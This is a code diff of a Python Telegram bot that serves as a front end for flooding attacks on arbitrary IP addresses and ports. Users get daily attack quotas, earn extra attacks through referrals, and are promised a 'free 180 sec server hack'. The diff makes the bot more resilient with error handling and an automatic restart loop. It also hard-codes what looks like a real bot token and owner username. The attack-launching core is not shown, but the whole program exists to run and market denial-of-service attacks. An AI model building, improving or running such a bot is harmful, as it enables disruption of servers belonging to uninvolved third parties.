@@ -2,8 +2,13 @@ import os
 import asyncio
 import logging
 import uuid
+import time
+import httpx
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
+
+# Configure HTTPX to be more resilient
+httpx._config.DEFAULT_TIMEOUT_CONFIG = 10.0  # Set default timeout to 10 seconds
 
 # Suppress HTTP request logs
 logging.getLogger("httpx").setLevel(logging.WARNING)
@@ -16,11 +21,11 @@ logging.basicConfig(
 )
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'  # Replace with your bot token
-OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
-ALLOWED_GROUP_ID = -1002491572572  # Replace with your allowed group ID
-MAX_THREADS = 2000  # Default max threads
-max_duration = 200  # Default max attack duration
+TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'
+OWNER_USERNAME = "Riyahacksyt"
+ALLOWED_GROUP_ID = -1002491572572
+MAX_THREADS = 1500
+max_duration = 120
 daily_attack_limit = 3
 
 # Attack & Feedback System
@@ -30,9 +35,9 @@ feedback_waiting = {}
 attack_ban_list = {}
 
 # Referral System
-referral_codes = {}  # Stores referral codes for users
-referral_rewards = {}  # Tracks rewards for users who refer others
-referral_history = {}  # Tracks who referred whom to prevent duplicate referrals
+referral_codes = {}
+referral_rewards = {}
+referral_history = {}
 
 # Custom Keyboard for Regular Users
 regular_user_keyboard = [['🚀 Start', '⚔️ Attack'], ['🏆 Leaderboard']]
@@ -49,7 +54,6 @@ owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 # Scripts Folder
 SCRIPTS_FOLDER = "scripts"
 
-# Load external scripts
 def load_scripts(application):
     if not os.path.exists(SCRIPTS_FOLDER):
         os.makedirs(SCRIPTS_FOLDER)
@@ -58,144 +62,156 @@ def load_scripts(application):
 
     for filename in os.listdir(SCRIPTS_FOLDER):
         if filename.endswith(".py"):
-            script_path = os.path.join(SCRIPTS_FOLDER, filename)
-            spec = importlib.util.spec_from_file_location(filename[:-3], script_path)
-            module = importlib.util.module_from_spec(spec)
-            spec.loader.exec_module(module)
+            try:
+                script_path = os.path.join(SCRIPTS_FOLDER, filename)
+                spec = importlib.util.spec_from_file_location(filename[:-3], script_path)
+                module = importlib.util.module_from_spec(spec)
+                spec.loader.exec_module(module)
 
-            if hasattr(module, "register_handlers"):
-                module.register_handlers(application)
-                logging.info(f"Loaded script: {filename}")
+                if hasattr(module, "register_handlers"):
+                    module.register_handlers(application)
+                    logging.info(f"Loaded script: {filename}")
+            except Exception as e:
+                logging.error(f"Error loading script {filename}: {e}")
 
-# Check if bot is used in the allowed group
 def is_allowed_group(update: Update):
-    chat = update.effective_chat
-    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID
+    try:
+        chat = update.effective_chat
+        return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID
+    except Exception as e:
+        logging.error(f"Error in is_allowed_group: {e}")
+        return False
 
-# Check if the user is the owner
 def is_owner(update: Update):
-    return update.effective_user.username == OWNER_USERNAME
+    try:
+        return update.effective_user.username == OWNER_USERNAME
+    except Exception as e:
+        logging.error(f"Error in is_owner: {e}")
+        return False
 
-# Generate a unique referral code for a user
 def generate_referral_code(user_id):
-    if user_id not in referral_codes:
-        referral_codes[user_id] = str(uuid.uuid4())[:8]  # Generate a short unique code
-    return referral_codes[user_id]
+    try:
+        if user_id not in referral_codes:
+            referral_codes[user_id] = str(uuid.uuid4())[:8]
+        return referral_codes[user_id]
+    except Exception as e:
+        logging.error(f"Error generating referral code: {e}")
+        return str(uuid.uuid4())[:8]
 
-# Start Command
 async def start(update: Update, context: CallbackContext):
-    chat = update.effective_chat
+    try:
+        chat = update.effective_chat
 
-    # If the user starts the bot in a private chat, send the main channel link
-    if chat.type == "private":
-        main_channel_link = "https://t.me/+wnHGZwkgKBo0ZDdl"  # Replace with your main channel link
-        await update.message.reply_text(
-            f"🌟 *Welcome!* 🌟\n\n"
-            f"🔗 *Join our main channel for free 180 sec server hack:* {main_channel_link}\n\n"
-            "*Use the bot in the allowed group for attacks and referrals!*",
-            parse_mode='Markdown'
-        )
-        return
+        if chat.type == "private":
+            main_channel_link = "https://t.me/+wnHGZwkgKBo0ZDdl"
+            await update.message.reply_text(
+                f"🌟 *Welcome!* 🌟\n\n"
+                f"🔗 *Join our main channel for free 180 sec server hack:* {main_channel_link}\n\n"
+                "*Use the bot in the allowed group for attacks and referrals!*",
+                parse_mode='Markdown'
+            )
+            return
 
-    # If the user starts the bot in the allowed group
-    if not is_allowed_group(update):
-        return
+        if not is_allowed_group(update):
+            return
 
-    user_id = update.effective_user.id
-    if user_id not in user_attacks:
-        user_attacks[user_id] = daily_attack_limit
+        user_id = update.effective_user.id
+        if user_id not in user_attacks:
+            user_attacks[user_id] = daily_attack_limit
 
-    # Generate or fetch referral code
-    referral_code = generate_referral_code(user_id)
-    referral_link = f"https://t.me/{context.bot.username}?start={referral_code}"
-
-    message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use ⚔️ Attack to start an attack!*\n\n"
-        f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
-        "*💥 Let the war begin!*\n\n"
-        f"🔗 *Your Referral Link:* `{referral_link}`\n"
-        "*Invite friends to earn extra attacks!*"
-    )
-
-    # Show different keyboards for owner and regular users
-    if is_owner(update):
-        await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
-    else:
-        await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=regular_user_markup)
-
-# Attack Command
-async def attack(update: Update, context: CallbackContext):
-    global attack_running
-    if not is_allowed_group(update):
-        return
-
-    user_id = update.effective_user.id
-
-    if user_id in attack_ban_list:
-        await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
-        return
-
-    if attack_running:
-        await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
-        return
-
-    if user_id not in user_attacks:
-        user_attacks[user_id] = daily_attack_limit
-
-    if user_attacks[user_id] <= 0:
-        # Prompt user to refer others
         referral_code = generate_referral_code(user_id)
         referral_link = f"https://t.me/{context.bot.username}?start={referral_code}"
+
+        message = (
+            "*🔥 Welcome to the battlefield! 🔥*\n\n"
+            "*Use ⚔️ Attack to start an attack!*\n\n"
+            f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
+            "*💥 Let the war begin!*\n\n"
+            f"🔗 *Your Referral Link:* `{referral_link}`\n"
+            "*Invite friends to earn extra attacks!*"
+        )
+
+        if is_owner(update):
+            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
+        else:
+            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=regular_user_markup)
+    except Exception as e:
+        logging.error(f"Error in start command: {e}")
+        await update.message.reply_text("⚠️ An error occurred. Please try again.", parse_mode='Markdown')
+
+async def attack(update: Update, context: CallbackContext):
+    global attack_running
+    try:
+        if not is_allowed_group(update):
+            return
+
+        user_id = update.effective_user.id
+
+        if user_id in attack_ban_list:
+            await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
+            return
+
+        if attack_running:
+            await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
+            return
+
+        if user_id not in user_attacks:
+            user_attacks[user_id] = daily_attack_limit
+
+        if user_attacks[user_id] <= 0:
+            referral_code = generate_referral_code(user_id)
+            referral_link = f"https://t.me/{context.bot.username}?start={referral_code}"
+            await update.message.reply_text(
+                "❌ *You have used all your daily attacks!*\n\n"
+                f"🔗 *Refer friends using your link to earn more attacks:* `{referral_link}`",
+                parse_mode='Markdown'
+            )
+            return
+
+        if update.message.text == '⚔️ Attack':
+            await update.message.reply_text("⚠️ *Please use the /attack command with arguments: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
+            return
+
+        args = context.args
+        if len(args) != 4:
+            await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
+            return
+
+        ip, port, duration, threads = args
+        duration = int(duration)
+        threads = int(threads)
+
+        if duration > max_duration:
+            await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
+            return
+
+        if threads > MAX_THREADS:
+            await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
+            return
+
+        attack_running = True
+        user_attacks[user_id] -= 1
+        remaining_attacks = user_attacks[user_id]
+
+        feedback_waiting[user_id] = True
+
         await update.message.reply_text(
-            "❌ *You have used all your daily attacks!*\n\n"
-            f"🔗 *Refer friends using your link to earn more attacks:* `{referral_link}`",
+            f"⚔️ *Attack Started!*\n"
+            f"🎯 *Target*: {ip}:{port}\n"
+            f"🕒 *Duration*: {duration} sec\n"
+            f"🧵 *Threads*: {threads}\n"
+            f"🔥 *Let the battlefield ignite! 💥*\n\n"
+            f"💥 *You have {remaining_attacks} attacks left today!*\n\n"
+            "📸 *Please send a photo feedback before the attack completes, or you will be banned for 10 minutes!*",
             parse_mode='Markdown'
         )
-        return
 
-    # Check if the command is triggered via button click
-    if update.message.text == '⚔️ Attack':
-        await update.message.reply_text("⚠️ *Please use the /attack command with arguments: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
-        return
+        asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context, user_id))
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+        attack_running = False
+        await update.message.reply_text("❌ *An error occurred while starting the attack. Please try again.*", parse_mode='Markdown')
 
-    args = context.args
-    if len(args) != 4:
-        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
-        return
-
-    ip, port, duration, threads = args
-    duration = int(duration)
-    threads = int(threads)
-
-    if duration > max_duration:
-        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
-        return
-
-    if threads > MAX_THREADS:
-        await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
-        return
-
-    attack_running = True
-    user_attacks[user_id] -= 1
-    remaining_attacks = user_attacks[user_id]
-
-    feedback_waiting[user_id] = True
-
-    await update.message.reply_text(
-        f"⚔️ *Attack Started!*\n"
-        f"🎯 *Target*: {ip}:{port}\n"
-        f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Threads*: {threads}\n"
-        f"🔥 *Let the battlefield ignite! 💥*\n\n"
-        f"💥 *You have {remaining_attacks} attacks left today!*\n\n"
-        "📸 *Please send a photo feedback before the attack completes, or you will be banned for 10 minutes!*",
-        parse_mode='Markdown'
-    )
-
-    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context, user_id))
-
-# Run Attack in Background
 async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
     global attack_running
     try:
@@ -220,268 +236,288 @@ async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
         if feedback_waiting.get(user_id):
             await context.bot.send_message(chat_id=chat_id, text=f"❌ *You didn't send feedback! You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
             attack_ban_list[user_id] = True
-            asyncio.create_task(unban_user_after_delay(user_id, 600))  # 10 minutes delay
+            asyncio.create_task(unban_user_after_delay(user_id, 600))
         else:
             await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Finished, now next attack!*", parse_mode='Markdown')
 
-# Unban user after delay
 async def unban_user_after_delay(user_id, delay):
     await asyncio.sleep(delay)
     attack_ban_list.pop(user_id, None)
 
-# Handle Photo Feedback
 async def handle_photo(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id in feedback_waiting:
-        del feedback_waiting[user_id]
-        await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')
+    try:
+        user_id = update.effective_user.id
+        if user_id in feedback_waiting:
+            del feedback_waiting[user_id]
+            await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error handling photo: {e}")
 
-# Reset User Attacks
 async def reset_attacks(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
-        return
+    try:
+        if not is_owner(update):
+            await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
+            return
 
-    for user_id in user_attacks:
-        user_attacks[user_id] = daily_attack_limit
+        for user_id in user_attacks:
+            user_attacks[user_id] = daily_attack_limit
 
-    await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")
+        await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")
+    except Exception as e:
+        logging.error(f"Error resetting attacks: {e}")
+        await update.message.reply_text("❌ *Failed to reset attacks. Please try again.*", parse_mode='Markdown')
 
-# Set Maximum Attack Duration
 async def set_duration(update: Update, context: CallbackContext):
     global max_duration
+    try:
+        if not is_owner(update):
+            await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
+            return
 
-    if not is_owner(update):
-        await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
-        return
+        if update.message.text == '⏱ Set Duration':
+            await update.message.reply_text("⚠️ *Please use the /setduration command with arguments: /setduration <max_duration_sec>*", parse_mode='Markdown')
+            return
 
-    # Check if the command is triggered via button click
-    if update.message.text == '⏱ Set Duration':
-        await update.message.reply_text("⚠️ *Please use the /setduration command with arguments: /setduration <max_duration_sec>*", parse_mode='Markdown')
-        return
+        args = context.args
+        if len(args) != 1 or not args[0].isdigit():
+            await update.message.reply_text("⚠️ *Usage: /setduration <max_duration_sec>*", parse_mode='Markdown')
+            return
 
-    args = context.args
-    if len(args) != 1 or not args[0].isdigit():
-        await update.message.reply_text("⚠️ *Usage: /setduration <max_duration_sec>*", parse_mode='Markdown')
-        return
+        max_duration = int(args[0])
+        await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*")
+    except Exception as e:
+        logging.error(f"Error setting duration: {e}")
+        await update.message.reply_text("❌ *Failed to set duration. Please try again.*", parse_mode='Markdown')
 
-    max_duration = int(args[0])
-    await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*")
-
-# Set Maximum Threads
 async def set_threads(update: Update, context: CallbackContext):
     global MAX_THREADS
+    try:
+        if not is_owner(update):
+            await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
+            return
 
-    if not is_owner(update):
-        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
-        return
+        if update.message.text == '🧵 Set Threads':
+            await update.message.reply_text("⚠️ *Please use the /set_threads command with arguments: /set_threads <max_threads>*", parse_mode='Markdown')
+            return
 
-    # Check if the command is triggered via button click
-    if update.message.text == '🧵 Set Threads':
-        await update.message.reply_text("⚠️ *Please use the /set_threads command with arguments: /set_threads <max_threads>*", parse_mode='Markdown')
-        return
+        args = context.args
+        if len(args) != 1 or not args[0].isdigit():
+            await update.message.reply_text("⚠️ *Usage: /set_threads <max_threads>*", parse_mode='Markdown')
+            return
 
-    args = context.args
-    if len(args) != 1 or not args[0].isdigit():
-        await update.message.reply_text("⚠️ *Usage: /set_threads <max_threads>*", parse_mode='Markdown')
-        return
+        MAX_THREADS = int(args[0])
+        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*")
+    except Exception as e:
+        logging.error(f"Error setting threads: {e}")
+        await update.message.reply_text("❌ *Failed to set threads. Please try again.*", parse_mode='Markdown')
 
-    MAX_THREADS = int(args[0])
-    await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*")
-
-# Function to Display Stylish Leaderboard
 async def show_leaderboard(update: Update, context: CallbackContext):
-    if not is_allowed_group(update):
-        return
+    try:
+        if not is_allowed_group(update):
+            return
 
-    # Sort users by the number of referrals
-    sorted_referrals = sorted(referral_rewards.items(), key=lambda x: x[1], reverse=True)
+        sorted_referrals = sorted(referral_rewards.items(), key=lambda x: x[1], reverse=True)
 
-    # Prepare the leaderboard message
-    leaderboard_message = "🏆 *Top Referrers Leaderboard* 🏆\n\n"
-    for i, (user_id, referrals) in enumerate(sorted_referrals[:10], start=1):
-        user = await context.bot.get_chat(user_id)
-        username = user.username or user.first_name
+        leaderboard_message = "🏆 *Top Referrers Leaderboard* 🏆\n\n"
+        
+        for i, (user_id, referrals) in enumerate(sorted_referrals[:10], start=1):
+            try:
+                user = await context.bot.get_chat(user_id)
+                username = user.username or user.first_name or f"User {user_id}"
 
-        # Highlight the top referrer
-        if i == 1:
-            leaderboard_message += f"👑 *{i}. {username}: {referrals} referrals*\n"
+                if i == 1:
+                    leaderboard_message += f"👑 *{i}. {username}: {referrals} referrals*\n"
+                else:
+                    leaderboard_message += f"{i}. {username}: {referrals} referrals\n"
+            except Exception as e:
+                logging.error(f"Error getting user info for {user_id}: {e}")
+                leaderboard_message += f"{i}. User {user_id}: {referrals} referrals\n"
+
+        if len(sorted_referrals) > 0:
+            leaderboard_message += "\n🎖 *The top referrer will receive extra attacks as a reward!*"
         else:
-            leaderboard_message += f"{i}. {username}: {referrals} referrals\n"
+            leaderboard_message += "\nNo referrals yet. Be the first to refer friends!"
 
-    # Add a note about the reward for the top referrer
-    if len(sorted_referrals) > 0:
-        leaderboard_message += "\n🎖 *The top referrer will receive extra attacks as a reward!*"
-
-    await update.message.reply_text(leaderboard_message, parse_mode='Markdown')
-
-# Function to Reward the Top Referrer
-async def reward_top_referrer(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ *Only the owner can reward the top referrer!*", parse_mode='Markdown')
-        return
-
-    # Sort users by the number of referrals
-    sorted_referrals = sorted(referral_rewards.items(), key=lambda x: x[1], reverse=True)
-
-    if len(sorted_referrals) == 0:
-        await update.message.reply_text("❌ *No referrals found to reward!*", parse_mode='Markdown')
-        return
-
-    # Get the top referrer
-    top_referrer_id, top_referrals = sorted_referrals[0]
-    top_referrer = await context.bot.get_chat(top_referrer_id)
-    top_referrer_name = top_referrer.username or top_referrer.first_name
-
-    # Reward the top referrer with extra attacks
-    extra_attacks = 5  # Number of extra attacks to reward
-    if top_referrer_id not in user_attacks:
-        user_attacks[top_referrer_id] = daily_attack_limit
-    user_attacks[top_referrer_id] += extra_attacks
-
-    # Send a message to the top referrer
-    await context.bot.send_message(
-        chat_id=top_referrer_id,
-        text=f"🎉 *Congratulations! You are the top referrer and have been rewarded with {extra_attacks} extra attacks!*\n"
-             f"⚔️ *Total attacks left:* {user_attacks[top_referrer_id]}",
-        parse_mode='Markdown'
-    )
-
-    # Notify the owner
-    await update.message.reply_text(
-        f"✅ *{top_referrer_name} has been rewarded with {extra_attacks} extra attacks for being the top referrer!*",
-        parse_mode='Markdown'
-    )
-
-# Function to Gift Attacks Manually
-async def gift_attacks(update: Update, context: CallbackContext):
-    if not is_owner(update):
-        await update.message.reply_text("❌ *Only the owner can gift attacks!*", parse_mode='Markdown')
-        return
-
-    # Check if the command is triggered via button click
-    if update.message.text == '🎁 Gift Attacks':
+        await update.message.reply_text(leaderboard_message, parse_mode='Markdown')
+        
+    except Exception as e:
+        logging.error(f"Error in show_leaderboard: {e}")
         await update.message.reply_text(
-            "⚠️ *Please use the /giftattacks command with arguments: /giftattacks <user_id> <number_of_attacks>*",
+            "⚠️ *Could not fetch leaderboard at the moment. Please try again later.*",
             parse_mode='Markdown'
         )
-        return
 
-    args = context.args
-    if len(args) != 2:
-        await update.message.reply_text("⚠️ *Usage: /giftattacks <user_id> <number_of_attacks>*", parse_mode='Markdown')
-        return
-
-    user_id, num_attacks = args
-    if not user_id.isdigit() or not num_attacks.isdigit():
-        await update.message.reply_text("❌ *Invalid user ID or number of attacks!*", parse_mode='Markdown')
-        return
-
-    user_id = int(user_id)
-    num_attacks = int(num_attacks)
-
-    # Check if the user exists
+async def reward_top_referrer(update: Update, context: CallbackContext):
     try:
-        user = await context.bot.get_chat(user_id)
+        if not is_owner(update):
+            await update.message.reply_text("❌ *Only the owner can reward the top referrer!*", parse_mode='Markdown')
+            return
+
+        sorted_referrals = sorted(referral_rewards.items(), key=lambda x: x[1], reverse=True)
+
+        if len(sorted_referrals) == 0:
+            await update.message.reply_text("❌ *No referrals found to reward!*", parse_mode='Markdown')
+            return
+
+        top_referrer_id, top_referrals = sorted_referrals[0]
+        top_referrer = await context.bot.get_chat(top_referrer_id)
+        top_referrer_name = top_referrer.username or top_referrer.first_name
+
+        extra_attacks = 5
+        if top_referrer_id not in user_attacks:
+            user_attacks[top_referrer_id] = daily_attack_limit
+        user_attacks[top_referrer_id] += extra_attacks
+
+        await context.bot.send_message(
+            chat_id=top_referrer_id,
+            text=f"🎉 *Congratulations! You are the top referrer and have been rewarded with {extra_attacks} extra attacks!*\n"
+                 f"⚔️ *Total attacks left:* {user_attacks[top_referrer_id]}",
+            parse_mode='Markdown'
+        )
+
+        await update.message.reply_text(
+            f"✅ *{top_referrer_name} has been rewarded with {extra_attacks} extra attacks for being the top referrer!*",
+            parse_mode='Markdown'
+        )
     except Exception as e:
-        await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
-        return
+        logging.error(f"Error rewarding top referrer: {e}")
+        await update.message.reply_text("❌ *Failed to reward top referrer. Please try again.*", parse_mode='Markdown')
 
-    # Add the attacks to the user's account
-    if user_id not in user_attacks:
-        user_attacks[user_id] = daily_attack_limit
-    user_attacks[user_id] += num_attacks
+async def gift_attacks(update: Update, context: CallbackContext):
+    try:
+        if not is_owner(update):
+            await update.message.reply_text("❌ *Only the owner can gift attacks!*", parse_mode='Markdown')
+            return
 
-    # Notify the owner
-    await update.message.reply_text(
-        f"✅ *{num_attacks} attacks have been gifted to {user.username or user.first_name}!*",
-        parse_mode='Markdown'
-    )
+        if update.message.text == '🎁 Gift Attacks':
+            await update.message.reply_text(
+                "⚠️ *Please use the /giftattacks command with arguments: /giftattacks <user_id> <number_of_attacks>*",
+                parse_mode='Markdown'
+            )
+            return
 
-    # Notify the user
-    await context.bot.send_message(
-        chat_id=user_id,
-        text=f"🎁 *You have been gifted {num_attacks} extra attacks by the owner!*\n"
-             f"⚔️ *Total attacks left:* {user_attacks[user_id]}",
-        parse_mode='Markdown'
-    )
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("⚠️ *Usage: /giftattacks <user_id> <number_of_attacks>*", parse_mode='Markdown')
+            return
 
-# Handle Button Clicks
+        user_id, num_attacks = args
+        if not user_id.isdigit() or not num_attacks.isdigit():
+            await update.message.reply_text("❌ *Invalid user ID or number of attacks!*", parse_mode='Markdown')
+            return
+
+        user_id = int(user_id)
+        num_attacks = int(num_attacks)
+
+        try:
+            user = await context.bot.get_chat(user_id)
+        except Exception as e:
+            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
+            return
+
+        if user_id not in user_attacks:
+            user_attacks[user_id] = daily_attack_limit
+        user_attacks[user_id] += num_attacks
+
+        await update.message.reply_text(
+            f"✅ *{num_attacks} attacks have been gifted to {user.username or user.first_name}!*",
+            parse_mode='Markdown'
+        )
+
+        await context.bot.send_message(
+            chat_id=user_id,
+            text=f"🎁 *You have been gifted {num_attacks} extra attacks by the owner!*\n"
+                 f"⚔️ *Total attacks left:* {user_attacks[user_id]}",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logging.error(f"Error gifting attacks: {e}")
+        await update.message.reply_text("❌ *Failed to gift attacks. Please try again.*", parse_mode='Markdown')
+
 async def handle_button_click(update: Update, context: CallbackContext):
-    query = update.message.text
+    try:
+        query = update.message.text
 
-    # Map button text to commands
-    if query == '🚀 Start':
-        await start(update, context)
-    elif query == '⚔️ Attack':
-        await update.message.reply_text("⚠️ *Please use the /attack command with arguments: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
-    elif query == '🔄 Reset Attacks':
-        await reset_attacks(update, context)
-    elif query == '⏱ Set Duration':
-        await update.message.reply_text("⚠️ *Please use the /setduration command with arguments: /setduration <max_duration_sec>*", parse_mode='Markdown')
-    elif query == '🧵 Set Threads':
-        await update.message.reply_text("⚠️ *Please use the /set_threads command with arguments: /set_threads <max_threads>*", parse_mode='Markdown')
-    elif query == '🏆 Leaderboard':
-        await show_leaderboard(update, context)
-    elif query == '🎖 Reward Top Referrer':
-        await reward_top_referrer(update, context)
-    elif query == '🎁 Gift Attacks':
-        await gift_attacks(update, context)
+        if query == '🚀 Start':
+            await start(update, context)
+        elif query == '⚔️ Attack':
+            await update.message.reply_text("⚠️ *Please use the /attack command with arguments: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
+        elif query == '🔄 Reset Attacks':
+            await reset_attacks(update, context)
+        elif query == '⏱ Set Duration':
+            await update.message.reply_text("⚠️ *Please use the /setduration command with arguments: /setduration <max_duration_sec>*", parse_mode='Markdown')
+        elif query == '🧵 Set Threads':
+            await update.message.reply_text("⚠️ *Please use the /set_threads command with arguments: /set_threads <max_threads>*", parse_mode='Markdown')
+        elif query == '🏆 Leaderboard':
+            await show_leaderboard(update, context)
+        elif query == '🎖 Reward Top Referrer':
+            await reward_top_referrer(update, context)
+        elif query == '🎁 Gift Attacks':
+            await gift_attacks(update, context)
+    except Exception as e:
+        logging.error(f"Error handling button click: {e}")
+        await update.message.reply_text("⚠️ *An error occurred. Please try again.*", parse_mode='Markdown')
 
-# Handle Referral Links
 async def handle_referral(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    args = context.args
+    try:
+        user_id = update.effective_user.id
+        args = context.args
 
-    if args and args[0] in referral_codes.values():
-        # Find the user who referred this user
-        referrer_id = next((uid for uid, code in referral_codes.items() if code == args[0]), None)
+        if args and args[0] in referral_codes.values():
+            referrer_id = next((uid for uid, code in referral_codes.items() if code == args[0]), None)
 
-        # Prevent self-referral and duplicate referrals
-        if referrer_id and referrer_id != user_id:
-            if referrer_id not in referral_history:
-                referral_history[referrer_id] = set()
+            if referrer_id and referrer_id != user_id:
+                if referrer_id not in referral_history:
+                    referral_history[referrer_id] = set()
 
-            if user_id not in referral_history[referrer_id]:
-                # Reward the referrer
-                if referrer_id not in referral_rewards:
-                    referral_rewards[referrer_id] = 0
-                referral_rewards[referrer_id] += 1
-                user_attacks[referrer_id] += 1  # Give extra attack to referrer
+                if user_id not in referral_history[referrer_id]:
+                    if referrer_id not in referral_rewards:
+                        referral_rewards[referrer_id] = 0
+                    referral_rewards[referrer_id] += 1
+                    user_attacks[referrer_id] += 1
 
-                # Track the referral
-                referral_history[referrer_id].add(user_id)
+                    referral_history[referrer_id].add(user_id)
 
-                await context.bot.send_message(
-                    chat_id=referrer_id,
-                    text=f"🎉 *You have been rewarded with 1 extra attack for a successful referral!*\n"
-                         f"⚔️ *Total attacks left:* {user_attacks[referrer_id]}",
-                    parse_mode='Markdown'
-                )
-            else:
-                await update.message.reply_text(
-                    "❌ *You have already referred this user!*",
-                    parse_mode='Markdown'
-                )
+                    await context.bot.send_message(
+                        chat_id=referrer_id,
+                        text=f"🎉 *You have been rewarded with 1 extra attack for a successful referral!*\n"
+                             f"⚔️ *Total attacks left:* {user_attacks[referrer_id]}",
+                        parse_mode='Markdown'
+                    )
+                else:
+                    await update.message.reply_text(
+                        "❌ *You have already referred this user!*",
+                        parse_mode='Markdown'
+                    )
 
-    await start(update, context)  # Show the start message
+        await start(update, context)
+    except Exception as e:
+        logging.error(f"Error handling referral: {e}")
+        await update.message.reply_text("⚠️ *An error occurred. Please try again.*", parse_mode='Markdown')
 
-# Main Bot Setup
 def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", handle_referral))  # Handle referrals
-    application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("resetattacks", reset_attacks))
-    application.add_handler(CommandHandler("setduration", set_duration))
-    application.add_handler(CommandHandler("set_threads", set_threads))
-    application.add_handler(CommandHandler("giftattacks", gift_attacks))  # Handle gifting attacks
-    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
+    while True:
+        try:
+            application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+            
+            # Add handlers
+            application.add_handler(CommandHandler("start", handle_referral))
+            application.add_handler(CommandHandler("attack", attack))
+            application.add_handler(CommandHandler("resetattacks", reset_attacks))
+            application.add_handler(CommandHandler("setduration", set_duration))
+            application.add_handler(CommandHandler("set_threads", set_threads))
+            application.add_handler(CommandHandler("giftattacks", gift_attacks))
+            application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
 
-    # Load external scripts
-    load_scripts(application)
+            # Load external scripts
+            load_scripts(application)
 
-    application.run_polling()
+            application.run_polling()
+        except Exception as e:
+            logging.error(f"Bot crashed: {e}")
+            logging.info("Restarting bot in 10 seconds...")
+            time.sleep(10)
 
 if __name__ == '__main__':
     main()
